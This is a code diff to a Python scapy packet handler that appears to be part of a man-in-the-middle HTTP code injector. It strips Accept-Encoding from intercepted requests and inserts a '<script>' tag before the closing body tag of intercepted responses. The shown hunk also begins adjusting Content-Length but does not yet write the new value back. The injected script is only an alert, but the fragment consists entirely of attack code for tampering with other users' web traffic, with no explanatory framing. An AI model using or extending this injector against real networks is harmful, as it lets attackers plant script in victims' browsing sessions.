@@ -24,7 +24,13 @@ def process_packet(packet):
 			load = re.sub("Accept-Encoding:.*?\\r\\n", "", load)
 		elif scapy_packet[scapy.TCP].sport == 80:
 			print("[+] Response")
-			load = load.replace("<body>", "<script>alert('CykaBlyat!')</script><body>")
+			injection = "<script>alert('CykaBlyat!')</script>"
+			load = load.replace("</body>", injection + "</body>")
+			content_len_search = re.search("(?:Content-Length:\s)(\d*)", load)
+
+			if content_len_search:
+				content_len = content_len_search.group(1)
+				new_content_len = int(content_len) + len(injection)
 
 		if load != scapy_packet[scapy.Raw].load:
 			new_packet = set_load(scapy_packet, load)
